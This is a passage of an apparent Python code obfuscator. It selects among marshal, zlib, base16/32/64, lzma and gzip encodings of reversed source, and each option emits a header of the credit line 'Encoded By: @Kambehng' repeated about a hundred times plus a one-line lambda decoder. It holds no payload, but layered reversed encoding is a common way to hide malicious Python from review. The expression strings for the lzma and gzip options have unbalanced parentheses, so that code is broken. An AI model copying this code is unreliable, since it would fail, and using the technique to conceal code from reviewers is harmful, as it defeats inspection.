Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__[::-1]);"
    elif option == 2:
        xx = "zlb(data.encode('utf8'))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('zlib').decompress(__[::-1]);"
    elif option == 3:
        xx = "b16(data.encode('utf8'))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('base64').b16decode(__[::-1]);"
    elif option == 4:
        xx = "b32(data.encode('utf8'))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('base64').b32decode(__[::-1]);"
    elif option == 5:
        xx = "b64(data.encode('utf8'))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('base64').b64decode(__[::-1]);"
    elif option == 6:
        xx = "lzm(data.encode('utf8')[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('lzma').decompress(__[::-1]);"
    elif option == 7:
        xx = "gzi(data.encode('utf8')[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('gzip').decompress(__[::-1]);"
    elif option == 8:
        xx = "b16(zlb(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 9:
        xx = "b32(zlb(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));"
    elif option == 10:
        xx = "b64(zlb(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n 